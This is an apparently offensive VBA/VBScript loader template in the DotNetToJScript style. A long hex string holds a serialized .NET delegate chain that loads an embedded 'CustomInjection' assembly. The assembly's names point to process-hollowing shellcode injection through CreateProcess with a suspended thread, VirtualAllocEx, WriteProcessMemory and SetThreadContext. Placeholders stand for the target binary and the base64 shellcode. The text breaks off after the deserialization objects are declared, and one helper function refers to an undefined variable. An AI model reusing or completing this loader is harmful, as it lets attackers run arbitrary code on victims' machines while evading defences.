Sub DebugPrint(s)
End Sub

Sub SetVersion
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim tempDOM, tempELEMENT
    Set tempDOM = CreateObject("Microsoft.XMLDOM")
    Set tempELEMENT = tempDOM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = tempELEMENT.NodeTypedValue
End Function

Function Run()
    On Error Resume Next

    SetVersion

    Dim serialized_obj
        serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
    serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
    serialized_obj = serialized_obj & "656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    serialized_obj = serialized_obj & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E"
    serialized_obj = serialized_obj & "666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44"
    serialized_obj = serialized_obj & "656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    serialized_obj = serialized_obj & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A"
    serialized_obj = serialized_obj & "6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C6567617465536572"
    serialized_obj = serialized_obj & "69616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    serialized_obj = serialized_obj & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056"
    serialized_obj = serialized_obj & "657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237"
    serialized_obj = serialized_obj & "376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    serialized_obj = serialized_obj & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C"
    serialized_obj = serialized_obj & "697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374"
    serialized_obj = serialized_obj & "656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    serialized_obj = serialized_obj & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C"
    serialized_obj = serialized_obj & "000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A"
    serialized_obj = serialized_obj & "6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    serialized_obj = serialized_obj & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E54797065"
    serialized_obj = serialized_obj & "5B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B65"
    serialized_obj = serialized_obj & "2853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    serialized_obj = serialized_obj & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E30"
    serialized_obj = serialized_obj & "2E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530"
    serialized_obj = serialized_obj & "383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    serialized_obj = serialized_obj & "6C790617000000044C6F61640A0F0C000000002A0000024D5A90000300000004000000FFFF0000B800000000000000400000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD"
    serialized_obj = serialized_obj & "21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    serialized_obj = serialized_obj & "00504500004C010300F831145A0000000000000000E00002210B013000002000000008000000000000E23E00000020000000"
    serialized_obj = serialized_obj & "4000000000001000200000000200000400000000000000040000000000000000800000000200000000000003004085000010"
    serialized_obj = serialized_obj & "0000100000000010000010000000000000100000000000000000000000903E00004F000000004000000C0400000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000006000000C000000583D00001C0000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E"
    serialized_obj = serialized_obj & "74657874000000E81E0000002000000020000000020000000000000000000000000000200000602E727372630000000C0400"
    serialized_obj = serialized_obj & "00004000000006000000220000000000000000000000000000400000402E72656C6F6300000C000000006000000002000000"
    serialized_obj = serialized_obj & "2800000000000000000000000000004000004200000000000000000000000000000000C43E00000000000048000000020005"
    serialized_obj = serialized_obj & "0040220000181B00000300000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000001E02281100000A2A13300A00500100000100001104281200000A0A068E69731300000A"
    serialized_obj = serialized_obj & "26730D0000060B07167D3200000472010000700D7203000070281400000A281500000A2C137203000070281400000A032816"
    serialized_obj = serialized_obj & "00000A0D2B117229000070281400000A03281600000A0D09141414171A7E1700000A14071202280300000626087B04000004"
    serialized_obj = serialized_obj & "13041204281800000A724F000070281900000A39C40000001205FE150D000002120520070001007D6E000004087B05000004"
    serialized_obj = serialized_obj & "120528010000062611057B7F0000046E281A00000A1306110613071206281800000A724F000070281B00000A2C0A11041628"
    serialized_obj = serialized_obj & "07000006262A1613081209068E69281300000A11041106061109110828060000062616130A11041106068E691F40120A2808"
    serialized_obj = serialized_obj & "0000062612051107281C00000A7D7F00000412051107281C00000A7D81000004120520070001007D6E000004087B05000004"
    serialized_obj = serialized_obj & "1205280200000626087B050000042809000006262A7A027E1700000A7D0200000402281100000A0202281D00000A7D010000"
    serialized_obj = serialized_obj & "042A00133002006000000000000000027E1700000A7D28000004027E1700000A7D29000004027E1700000A7D2A000004027E"
    serialized_obj = serialized_obj & "1700000A7D35000004027E1700000A7D36000004027E1700000A7D37000004027E1700000A7D3800000402281100000A0202"
    serialized_obj = serialized_obj & "281D00000A7D270000042A42534A4201000100000000000C00000076322E302E35303732370000000005006C000000640A00"
    serialized_obj = serialized_obj & "00237E0000D00A0000AC0C000023537472696E6773000000007C1700005400000023555300D0170000100000002347554944"
    serialized_obj = serialized_obj & "000000E01700003803000023426C6F620000000000000002000001577D02140902000000FA013300160000010000001B0000"
    serialized_obj = serialized_obj & "000F000000970000000D000000230000001D0000004400000013000000030000000100000001000000010000000900000001"
    serialized_obj = serialized_obj & "000000010000000D00000000009B0801000000000006005707E3090600C407E30906006906B1090F00030A0000060091060E"
    serialized_obj = serialized_obj & "0906002B070E0906000C070E090600AB070E09060077070E09060090070E090600A8060E0906007D06C40906004106C40906"
    serialized_obj = serialized_obj & "00D3060E090600EF08B60A0600F006B60A06004F069A0C06007A0BB70806002006B70806004807B7080600BE08B7080600C1"
    serialized_obj = serialized_obj & "0BB70806008609B7080600B50BB7080600690CA20206006308B70806008608C4090000000057000000000001000100010010"
    serialized_obj = serialized_obj & "00090B00004900010001000A001000640A0000490001000C000A011000DC0800004D0004000D00020100008E0A0000550008"
    serialized_obj = serialized_obj & "000D000A00100033090000490027000D00020100002C060000550039000E000201000020090000550042000E000201000013"
    serialized_obj = serialized_obj & "0B000055004E000E000B0110003F0200004D0058000E000B011000930200004D005C000E000A011000600000004D0065000E"
    serialized_obj = serialized_obj & "000A011000D30400004D006E000E00020100000A030000550087000E000A011000250200004D0092000E0006006A08DF0106"
    serialized_obj = serialized_obj & "00710948000600DC05E2010600310B48000600A605480006008D05DF0106006505DF0106063F05E50156800604E801568014"
    serialized_obj = serialized_obj & "04E8015680A900E8015680DC03E80156800001E8015680BD03E80156805B03E80156808703E80156806F03E8015680B902E8"
    serialized_obj = serialized_obj & "0156807404E8015680DE01E8015680C801E80156801803E8015680B703E80156809B03E80156800B05E80156802305E80156"
    serialized_obj = serialized_obj & "80ED03E80156808F04E80156800702E8015680CA00E80156808200E80156807E01E8015680E600E8015680DB04E8015680E2"
    serialized_obj = serialized_obj & "02E80156806F01E8015680EF02E80156805704E80106005405DF010600AE05480006004C0948000600EB0548000600EC04DF"
    serialized_obj = serialized_obj & "0106003B05DF010600EC07DF010600F407DF010600D20ADF010600E00ADF010600C306DF010600AE0ADF0106000A0CEC0106"
    serialized_obj = serialized_obj & "001500EC010600210048000600C90B48000600D30B480006006109480006063F05E50156805004EF0156805201EF0156809F"
    serialized_obj = serialized_obj & "02EF0156804A04EF015680FE02EF0156806601EF0156808A02EF0156805A01EF0106063F05E50156804A01F30156809C00F3"
    serialized_obj = serialized_obj & "0156803801F3015680F904F3015680D303F3015680F004F30156804001F30156800105F30156800E08F30156802108F30156"
    serialized_obj = serialized_obj & "803608F30106063F05DF0156802201F70156801301F7015680C304F7015680CF04F70156805302F70156806302F7015680F6"
    serialized_obj = serialized_obj & "01F70156802C01F70156807502F7010600310B48000600A605480006008D05E50106006505E50106005405E5010600AE05FB"
    serialized_obj = serialized_obj & "0106004C09FB010600EB05FB0106106005FE010600210002020600C90B48000600D30B48000600610948000600AF08E50106"
    serialized_obj = serialized_obj & "006C0BE50106000A08E5010600B202E50106004304E5010600AC02E50106003D04E50106104705FE0106003B06E5010600A1"
    serialized_obj = serialized_obj & "0AE50106000100E50106000500E50106002D00E50106003100E50106004F00E50106005300E5010600E20705020600A509E5"
    serialized_obj = serialized_obj & "0106009F09E50106009909E50106009309E50106007108E50106007508E50106003A0CE5010600420CE50106003E0CE50106"
    serialized_obj = serialized_obj & "00360CE50106004409E50106004809E50106008D09E5010600770AE50106005609E5010600AB09E5010610EE0AFE0106063F"
    serialized_obj = serialized_obj & "05E5015680350009025680420009025680B80109025680D202090256802C0409025680AC0409025680430309025680280309"
    serialized_obj = serialized_obj & "025680AB01090256809F0109020600680B480006003A0B480006007908480006008D0C48000600BA00480006007005480000"
    serialized_obj = serialized_obj & "00000080009620DE0B0D0201000000000080009620EF0B0D02030000000000800096207300150205000000000080009620C3"
    serialized_obj = serialized_obj & "0529020F000000000080009620160C2E02100000000000800096204D0C390215000000000080009620200B43021A00000000"
    serialized_obj = serialized_obj & "0080009620250C49021C00000000008000962099055402210050200000000086186B09060022005820000000008600000B59"
    serialized_obj = serialized_obj & "022200B4210000000086186B0906002400D4210000000086186B090600240000000100A60500000200000C00000100A60500"
    serialized_obj = serialized_obj & "000200000C00000100000600000200120600000300500A000004003D0A000005002D0A000006007E0A00000700B30B000008"
    serialized_obj = serialized_obj & "00600C01000900310902000A00DA0800000100F30500000100D30500000200570B00000300FC07000004002A060000050090"
    serialized_obj = serialized_obj & "0B00000100310B00000200490B000003005A0900000400FC0700000500C30800000100310B00000200B90500000100310B00"
    serialized_obj = serialized_obj & "000200570B00000300FC07000004009A0B02000500810B00000100A60500000100460C00000200090009006B09010011006B"
    serialized_obj = serialized_obj & "09060019006B090A0029006B09100031006B09100039006B09100041006B09100049006B09100051006B09100059006B0910"
    serialized_obj = serialized_obj & "0061006B09150069006B09100071006B09100081006B091A0089006B090600A1006B09060091006B090600B10050083200B9"
    serialized_obj = serialized_obj & "006B090100C100120A3800C900610B3D00D100730B4200B9003F094800B90061084B00D1007F0C4F00B900A70B5500D10073"
    serialized_obj = serialized_obj & "0C4F00B900A70B5A00D90003085F00090024006D0009002800720009002C007700090030007C000900340081000900380086"
    serialized_obj = serialized_obj & "0009003C008B00090040009000090044009500090048009A0009004C009F0009005000A40009005400A90009005800AE0009"
    serialized_obj = serialized_obj & "005C00B30009006000B80009006400BD0009006800C20009006C00C70009007000CC0009007400D10009007800D60009007C"
    serialized_obj = serialized_obj & "00DB0009008000E00009008400E50009008800EA0009008C00EF0009009000F40009009400F90009009800FE000900E800A9"
    serialized_obj = serialized_obj & "000900EC00AE000900F00003010900F400CC000900F800F4000900FC00080109000001D10009000401D60009000C01810009"
    serialized_obj = serialized_obj & "0010018600090014018B0009001801900009001C016D00090020017200090024017700090028017C0009002C019500090030"
    serialized_obj = serialized_obj & "019A00090034019F0008003C016D00080040017200080044017C0008004801810008004C018600080050018B000800540190"
    serialized_obj = serialized_obj & "0008005801950008005C019A0009002002BD0009002402BD00090028020D0109002C021201090030021701090034021C0109"
    serialized_obj = serialized_obj & "003802210109003C022601090040022B0109004402300127007B006D002E000B005F022E00130068022E001B0087022E0023"
    serialized_obj = serialized_obj & "0090022E002B00A5022E003300CF022E003B00CF022E00430090022E004B00D5022E005300CF022E005B00CF022E006300FA"
    serialized_obj = serialized_obj & "022E006B00240343005B003103A30083006D00E30083006D00030183006D00230183006D00C000D501D800D8010C01DB0108"
    serialized_obj = serialized_obj & "000600350120008E0840010300DE0B010040010500EF0B0100000107007300010006010900C305010000010B00160C010000"
    serialized_obj = serialized_obj & "010D004D0C010000010F00200B010000011100250C01000001130099050100048000000100000000000000000000000000FE"
    serialized_obj = serialized_obj & "0800000200000000000000000000006400570500000000030002000400020005000200060002000700020008000200090002"
    serialized_obj = serialized_obj & "000A0002000B0002000C0002000D0002000E0002000F000200000000000044723000447231007368656C6C636F6465333200"
    serialized_obj = serialized_obj & "6362526573657276656432006C70526573657276656432004472320044723300434F4E544558545F6933383600434F4E5445"
    serialized_obj = serialized_obj & "58545F693438360044723600447237003C4D6F64756C653E00464C4F4154494E475F534156455F4152454100437265617465"
    serialized_obj = serialized_obj & "50726F6365737341004352454154455F425245414B415741595F46524F4D5F4A4F4200455845435554455F52454144004352"
    serialized_obj = serialized_obj & "454154455F53555350454E44454400556E6971756550726F6365737349440050524F434553535F4D4F44455F4241434B4752"
    serialized_obj = serialized_obj & "4F554E445F454E44004352454154455F44454641554C545F4552524F525F4D4F4445004352454154455F4E45575F434F4E53"
    serialized_obj = serialized_obj & "4F4C450053555350454E445F524553554D45005445524D494E41544500494D504552534F4E41544500455845435554455F52"
    serialized_obj = serialized_obj & "4541445752495445004558454355544500524553455256450057524954455F574154434800504859534943414C0050524F46"
    serialized_obj = serialized_obj & "494C455F4B45524E454C004352454154455F50524553455256455F434F44455F415554485A5F4C4556454C00434F4E544558"
    serialized_obj = serialized_obj & "545F414C4C00434F4E544558545F46554C4C00434F4E544558545F434F4E54524F4C004352454154455F5348415245445F57"
    serialized_obj = serialized_obj & "4F575F56444D004352454154455F53455041524154455F574F575F56444D005345545F5448524541445F544F4B454E005052"
    serialized_obj = serialized_obj & "4F434553535F4D4F44455F4241434B47524F554E445F424547494E0050524F434553535F42415349435F494E464F524D4154"
    serialized_obj = serialized_obj & "494F4E0050524F434553535F494E464F524D4154494F4E005345545F494E464F524D4154494F4E0051554552595F494E464F"
    serialized_obj = serialized_obj & "524D4154494F4E004449524543545F494D504552534F4E4154494F4E00544F505F444F574E0053544152545550494E464F00"
    serialized_obj = serialized_obj & "474F0053797374656D2E494F00446174614F004572726F724F004352454154455F4E45575F50524F434553535F47524F5550"
    serialized_obj = serialized_obj & "00434F4E544558545F494E54454745520050524F46494C455F555345520050524F46494C455F534552564552004C41524745"
    serialized_obj = serialized_obj & "5F504147455300434F4E544558545F464C414753004352454154455F464F524345444F5300434F4E544558545F455854454E"
    serialized_obj = serialized_obj & "4445445F52454749535445525300434F4E544558545F44454255475F5245474953544552530049444C455F5052494F524954"
    serialized_obj = serialized_obj & "595F434C415353005245414C54494D455F5052494F524954595F434C41535300484947485F5052494F524954595F434C4153"
    serialized_obj = serialized_obj & "530041424F56455F4E4F524D414C5F5052494F524954595F434C4153530042454C4F575F4E4F524D414C5F5052494F524954"
    serialized_obj = serialized_obj & "595F434C415353004E4F4143434553530044455441434845445F50524F43455353004352454154455F50524F544543544544"
    serialized_obj = serialized_obj & "5F50524F434553530044454255475F50524F434553530044454255475F4F4E4C595F544849535F50524F4345535300434F4E"
    serialized_obj = serialized_obj & "544558545F5345474D454E5453004461746153004572726F725300524553455400434F4D4D4954004352454154455F49474E"
    serialized_obj = serialized_obj & "4F52455F53595354454D5F44454641554C54004352454154455F554E49434F44455F454E5649524F4E4D454E540045585445"
    serialized_obj = serialized_obj & "4E4445445F53544152545550494E464F5F50524553454E5400434F4E544558545F464C4F4154494E475F504F494E54004745"
    serialized_obj = serialized_obj & "545F434F4E54455854005345545F434F4E54455854004352454154455F4E4F5F57494E444F570064775800524541444F4E4C"
    serialized_obj = serialized_obj & "5900455845435554455F5752495445434F505900494E48455249545F504152454E545F414646494E49545900494E48455249"
    serialized_obj = serialized_obj & "545F43414C4C45525F5052494F52495459006477590076616C75655F5F00526567697374657241726561006362006D73636F"
    serialized_obj = serialized_obj & "726C6962004D697363006477546872656164496400496E6865726974656446726F6D556E6971756550726F63657373496400"
    serialized_obj = serialized_obj & "647750726F63657373496400526573756D655468726561640068546872656164006C70526573657276656400754578697443"
    serialized_obj = serialized_obj & "6F6465004765744D6F64756C6548616E646C65006C7048616E646C650062496E686572697448616E646C65006C705469746C"
    serialized_obj = serialized_obj & "65006C704D6F64756C654E616D65006C704170706C69636174696F6E4E616D65006C70436F6D6D616E644C696E650056616C"
    serialized_obj = serialized_obj & "75655479706500666C416C6C6F636174696F6E54797065005374617465004775696441747472696275746500556E76657269"
    serialized_obj = serialized_obj & "666961626C65436F64654174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C65"
    serialized_obj = serialized_obj & "41747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B"
    serialized_obj = serialized_obj & "41747472696275746500647746696C6C41747472696275746500417373656D626C7946696C6556657273696F6E4174747269"
    serialized_obj = serialized_obj & "627574650053656375726974795065726D697373696F6E41747472696275746500417373656D626C79436F6E666967757261"
    serialized_obj = serialized_obj & "74696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500466C6167734174"
    serialized_obj = serialized_obj & "7472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C795072"
    serialized_obj = serialized_obj & "6F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79"
    serialized_obj = serialized_obj & "436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500466C6F"
    serialized_obj = serialized_obj & "6174536176650064775853697A650064775953697A6500647753697A650053697A654F66005461670047554152445F4D6F64"
    serialized_obj = serialized_obj & "6966696572666C6167004E4F43414348455F4D6F646966696572666C6167005752495445434F4D42494E455F4D6F64696669"
    serialized_obj = serialized_obj & "6572666C61670046726F6D426173653634537472696E6700546F537472696E67004C656E6774680045646900457369004166"
    serialized_obj = serialized_obj & "66696E6974794D61736B004D61727368616C006B65726E656C33322E646C6C00437573746F6D496E6A656374696F6E2E646C"
    serialized_obj = serialized_obj & "6C00436F6E74726F6C0053797374656D00456E756D006C704E756D6265724F6642797465735772697474656E006C7050726F"
    serialized_obj = serialized_obj & "63657373496E666F726D6174696F6E005365637572697479416374696F6E00437573746F6D496E6A656374696F6E00537973"
    serialized_obj = serialized_obj & "74656D2E5265666C656374696F6E004D656D6F727950726F74656374696F6E006C7053746172747570496E666F005A65726F"
    serialized_obj = serialized_obj & "0045627000456970006C704465736B746F70004573700062756666657200685374644572726F72002E63746F72006C705365"
    serialized_obj = serialized_obj & "63757269747944657363726970746F7200496E74507472005365674373005365674473005365674573005365674673005365"
    serialized_obj = serialized_obj & "6747730053656753730053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F"
    serialized_obj = serialized_obj & "7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E"
    serialized_obj = serialized_obj & "674D6F64657300457870616E64456E7669726F6E6D656E745661726961626C65730062496E686572697448616E646C657300"
    serialized_obj = serialized_obj & "6C7054687265616441747472696275746573006C7050726F6365737341747472696275746573005365637572697479417474"
    serialized_obj = serialized_obj & "726962757465730045466C6167730064774372656174696F6E466C6167730043726561746550726F63657373466C61677300"
    serialized_obj = serialized_obj & "436F6E74657874466C616773006477466C6167730053797374656D2E53656375726974792E5065726D697373696F6E730064"
    serialized_obj = serialized_obj & "7758436F756E74436861727300647759436F756E74436861727300457874656E6465645265676973746572730052756E436C"
    serialized_obj = serialized_obj & "6173730054657374436C61737300546872656164416363657373005465726D696E61746550726F63657373006850726F6365"
    serialized_obj = serialized_obj & "7373005065624261736541646472657373006C704261736541646472657373006C7041646472657373004578697374730045"
    serialized_obj = serialized_obj & "78697453746174757300436F6E636174004F626A656374006C70666C4F6C6450726F7465637400666C50726F746563740066"
    serialized_obj = serialized_obj & "6C4E657750726F74656374006F705F4578706C69636974006C70456E7669726F6E6D656E7400436F6E766572740068537464"
    serialized_obj = serialized_obj & "496E70757400685374644F757470757400476574546872656164436F6E7465787400536574546872656164436F6E74657874"
    serialized_obj = serialized_obj & "006C70436F6E74657874007753686F7757696E646F77005669727475616C416C6C6F634578005669727475616C50726F7465"
    serialized_obj = serialized_obj & "63744578004561780045627800456378004564780062696E61727900577269746550726F636573734D656D6F7279006C7043"
    serialized_obj = serialized_obj & "757272656E744469726563746F7279006F705F457175616C697479006F705F496E657175616C69747900426173655072696F"
    serialized_obj = serialized_obj & "726974790053797374656D2E5365637572697479000000000100252500570049004E0044004900520025005C005300790073"
    serialized_obj = serialized_obj & "0057004F005700360034005C0000252500570049004E0044004900520025005C00530079007300740065006D00330032005C"
    serialized_obj = serialized_obj & "00000330000000884BB5E72E30F64686CD54B68B58D4B800042001010803200001052001011111042001010E042001010205"
    serialized_obj = serialized_obj & "200101113D11070B1D05121811100E18113418180818090500011D050E0400010E0E040001020E0500020E0E0E0206180320"
    serialized_obj = serialized_obj & "000E050002020E0E040001180A0400010818040001081C08B77A5C561934E089040100000004020000000404000000040800"
    serialized_obj = serialized_obj & "0000041000000004200000000440000000048000000004000100000400020000040004000004000800000400100000040020"
    serialized_obj = serialized_obj & "0000040040000004008000000400000100040000020004000004000400000800040000100004000020000400000001040000"
    serialized_obj = serialized_obj & "0002040000000404000000080400000010040000002004000000400400000080040030000004000040000401000100040200"
    serialized_obj = serialized_obj & "010004040001000408000100041000010004200001000407000100043F000100809E2E01808453797374656D2E5365637572"
    serialized_obj = serialized_obj & "6974792E5065726D697373696F6E732E53656375726974795065726D697373696F6E4174747269627574652C206D73636F72"
    serialized_obj = serialized_obj & "6C69622C2056657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F"
    serialized_obj = serialized_obj & "6B656E3D623737613563353631393334653038391501540210536B6970566572696669636174696F6E01021E24021E50031E"
    serialized_obj = serialized_obj & "8200020608020602020609030611140206060306111C030611200306112402060E03061D0502060503061130030611380700"
    serialized_obj = serialized_obj & "02021810113413000A180E0E120C120C021114180E1218101110040001180E0A000518181818111C11200900050218181D05"
    serialized_obj = serialized_obj & "18080500020218090A000502181808112010090400010918052002010E0E0801000800000000001E01000100540216577261"
    serialized_obj = serialized_obj & "704E6F6E457863657074696F6E5468726F7773010801000200000000001401000F4578616D706C65417373656D626C790000"
    serialized_obj = serialized_obj & "290100244578616D706C6520417373656D626C7920666F7220446F744E6574546F4A53637269707400000501000000002401"
    serialized_obj = serialized_obj & "001F436F7079726967687420C2A9204A616D657320466F7273686177203230313700002901002435363539386631632D3664"
    serialized_obj = serialized_obj & "38382D343939342D613339322D61663333376162653537373700000C010007312E302E302E30000005010001000000000000"
    serialized_obj = serialized_obj & "00F831145A00000000020000001C010000743D0000741F0000525344531F2E223FF9638544BBCD24BB3C5DE69F0100000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000B83E00000000000000000000D23E0000002000000000000000000000000000000000000000000000C4"
    serialized_obj = serialized_obj & "3E0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000010010000000180000"
    serialized_obj = serialized_obj & "8000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058"
    serialized_obj = serialized_obj & "400000B00300000000000000000000B00334000000560053005F00560045005200530049004F004E005F0049004E0046004F"
    serialized_obj = serialized_obj & "0000000000BD04EFFE00000100000001000000000000000100000000003F0000000000000004000000020000000000000000"
    serialized_obj = serialized_obj & "00000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061"
    serialized_obj = serialized_obj & "006E0073006C006100740069006F006E00000000000000B00410030000010053007400720069006E006700460069006C0065"
    serialized_obj = serialized_obj & "0049006E0066006F000000EC020000010030003000300030003000340062003000000062002500010043006F006D006D0065"
    serialized_obj = serialized_obj & "006E007400730000004500780061006D0070006C006500200041007300730065006D0062006C007900200066006F00720020"
    serialized_obj = serialized_obj & "0044006F0074004E006500740054006F004A005300630072006900700074000000000022000100010043006F006D00700061"
    serialized_obj = serialized_obj & "006E0079004E0061006D0065000000000000000000480010000100460069006C006500440065007300630072006900700074"
    serialized_obj = serialized_obj & "0069006F006E00000000004500780061006D0070006C00650041007300730065006D0062006C007900000030000800010046"
    serialized_obj = serialized_obj & "0069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000048001400010049006E"
    serialized_obj = serialized_obj & "007400650072006E0061006C004E0061006D006500000043007500730074006F006D0049006E006A0065006300740069006F"
    serialized_obj = serialized_obj & "006E002E0064006C006C00000062001F0001004C006500670061006C0043006F007000790072006900670068007400000043"
    serialized_obj = serialized_obj & "006F0070007900720069006700680074002000A90020004A0061006D0065007300200046006F007200730068006100770020"
    serialized_obj = serialized_obj & "003200300031003700000000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000"
    serialized_obj = serialized_obj & "000000000000005000140001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000430075"
    serialized_obj = serialized_obj & "00730074006F006D0049006E006A0065006300740069006F006E002E0064006C006C000000400010000100500072006F0064"
    serialized_obj = serialized_obj & "007500630074004E0061006D006500000000004500780061006D0070006C00650041007300730065006D0062006C00790000"
    serialized_obj = serialized_obj & "00340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E0030"
    serialized_obj = serialized_obj & "00000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E"
    serialized_obj = serialized_obj & "0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000003000000C000000E43E000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000010D0000000400000009170000000906000000091600000006"
    serialized_obj = serialized_obj & "1A0000002753797374656D2E5265666C656374696F6E2E417373656D626C79204C6F616428427974655B5D29080000000A0B"

    entry_class = "TestClass"
    dllPath = "BINARY_TO_SPAWN"
    ShellCode = "BASE64_ENCODED_SHELLCODE"

    Dim tempmemstream As Object, tempformatstring As Object, temparraylist As Object
    Set tempmemstream = CreateObject("System.IO.MemoryStream")
    Set tempformatstring = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set temparraylist = CreateObject("System.Collections.ArrayList")

    Dim decodedValue
